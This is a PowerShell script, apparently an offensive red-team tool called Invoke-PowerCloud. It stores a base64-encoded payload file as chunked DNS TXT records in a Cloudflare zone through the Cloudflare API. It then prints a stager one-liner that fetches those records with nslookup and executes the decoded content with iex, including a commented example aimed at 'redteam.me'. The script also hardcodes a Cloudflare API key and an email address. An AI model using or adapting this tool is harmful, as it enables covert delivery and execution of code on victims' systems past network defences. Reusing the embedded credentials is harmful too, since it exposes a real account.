function Invoke-PowerCloud() {
    [CmdletBinding()] Param (

    [Parameter( Mandatory = $True, ParameterSetName = 'FilePath' )]
    [ValidateNotNullOrEmpty()]
    [Alias('Path')]
    [String]
    $FilePath,

    [Parameter(Mandatory = $True)]
    [ValidateNotNullOrEmpty()]
    [String]
    $Domain    
)

    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $Global:API = "8005d393edc8a713d15702606c7ae24c632a0"
    $Global:zoneId = ""
    $Global:API_URL = "https://api.cloudflare.com/client/v4"
    $Global:EMAIL = "mantvydo@gmail.com"
    $Global:HEADERS = @{
        "X-Auth-Key" = $API
        "X-Auth-Email" = $EMAIL
        "Content-Type" = "application/json"
    }

    function Invoke-GetRequest($endpoint) {
        $URL = "$Global:API_URL/$endpoint"
        $response = Invoke-WebRequest -Uri $URL -Headers $Global:HEADERS
        return $response
    }

    function Send-DNSZoneFile($body) {
        Write-Verbose "[*] Sending new zone file"
        $url = "$Global:API_URL/zones/$Global:zoneId/dns_records/import"
        $boundary = $body.boundary
        $response = Invoke-RestMethod -Uri $URL -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $body.content -Headers $Global:HEADERS  
        return $response
    }

    function Get-ZoneFileContent() {
        # $file = 'C:\tools\powercloud\zone.txt';
        $file = "zone.txt"
        $bytes = [System.IO.File]::ReadAllBytes($file)
        $content = [System.Text.Encoding]::GetEncoding('UTF-8').GetString($bytes)
        return $content
    }

    function New-RequestBody($content) {
        Write-Verbose "[*] Creating POST request body for sending DNS zone file"
        $boundary = [System.Guid]::NewGuid().ToString(); 
        $LF = "`r`n";
        
        $body = ( 
            "--$boundary",
            "Content-Disposition: form-data; name=`"file`"; filename=`"zone.txt`"",
            "Content-Type: application/octet-stream$LF",
            $content,
            "--$boundary--$LF" 
        ) -join $LF

        $request = @{"content" = $body; "boundary" = $boundary}

        return $request
    }

    function Get-B64EncodedFile() {
        Write-Verbose "[*] B64 encoding file $FilePath"
        $fileContent = Get-Content -raw $FilePath
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($fileContent)
        $b64 = [Convert]::ToBase64String($bytes)
        return $b64
    }

    function Get-Chunks($b64) {
        Write-Verbose "[*] Splitting file contents to chunks"
        $chunks = New-Object System.Collections.ArrayList
        $i = 0
        $txtLenght = 255
        while ($i -le ($b64.length - $txtLenght)) {  
            $chunk = $b64.Substring($i, $txtLenght)
            $i += $txtLenght
            $chunks.Add($chunk) | Out-Null
        }    

        $chunks.Add(($b64.Substring($i))) | Out-Null
        return $chunks
    }

    function New-TXTRecord($name, $value) { 
        return "$name IN TXT $value`n"
    }

    function New-ZoneFile($chunks) {
        Write-Verbose "[*] Creating new DNS zone file for $Domain"
        [int]$i = 1
        $chunks | foreach-object {
            $zoneFile += New-TXTRecord $i $_
            $i++
        }
        $zoneFileName = "zone.txt"
        Out-File -FilePath $zoneFileName -InputObject $zoneFile -Encoding "ASCII"
        Write-Verbose "[*] Saving DNS zone file for $Domain to $zoneFileName with $i records"
        $zoneFile = @{"content" = $zoneFile; "count" = $i-1}
        return $zoneFile
    }

    function Get-DNSRecords() {
        Write-Verbose "[*] Getting DNS TXT records for $Domain"
        $dnsRecords = (Invoke-GetRequest "/zones/$Global:zoneId/dns_records?type=TXT&per_page=100").Content
        return (ConvertFrom-Json $dnsRecords)
    }

    function Clear-DNSRecords($dnsRecords) {
        if ($dnsRecords.result) {
            Write-Verbose "[*] Removing TXT records for $Domain"
            $dnsRecords.result | foreach-object {
                $id = $_.id
                $url = "$Global:API_URL/zones/$Global:zoneId/dns_records/$id"
                Invoke-WebRequest -Uri $url -Headers $Global:HEADERS -Method DELETE
            }
        } else {
            Write-Verbose "[*] No TXT records for $Domain to remove"
        }
    }

    function Get-DNSZones() {
        Write-Verbose "[*] Getting DNS zones"
        $zones = (Invoke-GetRequest "/zones").Content
        return (ConvertFrom-Json $zones)
    }

    function Get-NameServer($dnsZones) {    
        Write-Verbose "[*] Getting primary NS for domain $Domain"
        $nameServer = $dnsZones.result | where-object {$_.name -eq $Domain} | select -ExpandProperty name_servers
        $nameServer = $nameServer[0]
        Write-Verbose "[*] Primary NS for $Domain is $nameServer"
        return $nameServer
    }

    function Get-ZoneId($dnsZones) {
        Write-Verbose "[*] Getting zone ID for domain $Domain"
        $zoneId = $dnsZones.result | where-object {$_.name -eq $Domain} | select -ExpandProperty id
        Write-Verbose "[*] Zone ID: $zoneId"
        return $zoneId
    }

    function Upload-DNSZoneFile($zoneFile) {
        $body = New-RequestBody $zoneFile
        Send-DNSZoneFile $body | out-null
    }

    function Write-Stager($chunksCount, $nameServer) {
        # $b64=""; (1..4) | ForEach-Object { $b64+=(nslookup -q=txt "$_.redteam.me" greg.ns.cloudflare.com)[-1] }; iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(($b64 -replace('\t|"',"")))))
        $stager = '$b64=""; (1..'+$chunksCount+') | ForEach-Object { $b64+=(nslookup -q=txt "$_.' + $Domain + '" ' + $nameServer + ')[-1] }; iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(($b64 -replace(''\t|"'',"")))))'
        Write-Host $stager
    }

    $zones = Get-DNSZones
    $Global:zoneId = Get-ZoneId $zones
    $nameServer = Get-NameServer $zones

    # run these first to clean old TXT entries
    $dnsRecords = Get-DNSRecords
    Clear-DNSRecords($dnsRecords) | out-null

    $b64 = Get-B64EncodedFile
    $chunks = Get-Chunks $b64
    $zoneFile = New-ZoneFile $chunks
    Upload-DNSZoneFile $zoneFile.content
    Write-Stager $zoneFile.count $nameServer
}
